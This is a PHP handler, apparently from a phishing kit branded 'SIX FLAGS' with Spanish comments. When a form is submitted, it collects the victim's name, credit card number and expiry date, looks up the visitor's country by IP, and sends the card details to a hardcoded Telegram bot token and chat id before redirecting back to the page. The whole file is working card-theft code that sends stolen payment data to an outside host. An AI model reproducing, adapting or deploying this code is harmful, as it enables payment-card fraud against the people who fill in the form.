<?php
date_default_timezone_set('America/Bogota');

function getFlags($code){
    $code = strtoupper($code);
   
    if($code == 'MX') return '🇲🇽';
    if($code == 'YT') return '🇾🇹';
    if($code == 'ZA') return '🇿🇦';
    if($code == 'ZM') return '🇿🇲';
    return '🚩';
}
if ($_SERVER['REQUEST_METHOD'] === 'POST')
{
	function get_client_ip() {
		$ipaddress = '';
		if (getenv('HTTP_CLIENT_IP'))
			$ipaddress = getenv('HTTP_CLIENT_IP');
		else if(getenv('HTTP_X_FORWARDED_FOR'))
			$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
		else if(getenv('HTTP_X_FORWARDED'))
			$ipaddress = getenv('HTTP_X_FORWARDED');
		else if(getenv('HTTP_FORWARDED_FOR'))
			$ipaddress = getenv('HTTP_FORWARDED_FOR');
		else if(getenv('HTTP_FORWARDED'))
		   $ipaddress = getenv('HTTP_FORWARDED');
		else if(getenv('REMOTE_ADDR'))
			$ipaddress = getenv('REMOTE_ADDR');
		else
			$ipaddress = 'UNKNOWN';
		return $ipaddress;
	}
	$ip = get_client_ip();
	$ip = substr($ip, 0, strpos($ip, ","));
	if($ip == "") $ip = "8.8.8.8";
	$res = file_get_contents('https://www.iplocate.io/api/lookup/' . $ip . '');
	$res = json_decode($res);
	$pais = $res->country_code;
	$tg = "6065537099"; //id del usuario
			
	//Datos del bot
	$token = "6024510791:AAFlE20ciCRghMMzoXUmSibSlngYRSt3nBY";
	$urlMsg = "https://api.telegram.org/bot{$token}/sendMessage";
	
	//Datos de la CC y demás.
	$hora = date("g:i A");
	$flag = getFlags($pais);


	//Mensaje
	$text = "";
	$text .= "🇲🇽 SIX FLAGS 🇲🇽\n\n";
	$text .= "\n————————————————————————\n";
	$text .= "Nombre: ".$_POST['username']."\n";
	$text .= "CC: ".$_POST['NUME']."\n";
	$text .= "Mes: ".$_POST['ME']."\n";
	$text .= "Año: ".$_POST['YEA']."\n";
	$text .= "\n————————————————————————\n";
	$text .= "⏳: $hora\n";
	
	
	//Enviar mensaje a Telegram
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $urlMsg);
	curl_setopt($ch, CURLOPT_HTTPGET, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$tg}&parse_mode=HTML&text=$text");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close($ch);
	

}

echo header("Location: ./index.php");

?>